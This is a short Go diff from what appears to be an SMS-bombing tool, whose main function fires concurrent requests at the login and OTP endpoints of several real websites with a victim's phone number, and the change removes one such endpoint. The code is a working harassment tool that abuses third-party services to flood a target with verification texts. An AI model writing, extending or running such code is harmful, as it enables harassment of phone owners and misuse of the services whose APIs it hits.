@@ -260,9 +260,6 @@ func main() {
 		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-		go sms("https://student.classino.com/otp/v1/api/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)    // add site
 		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
 			"mobile_phone": phone,
 		}, ch)    // add site
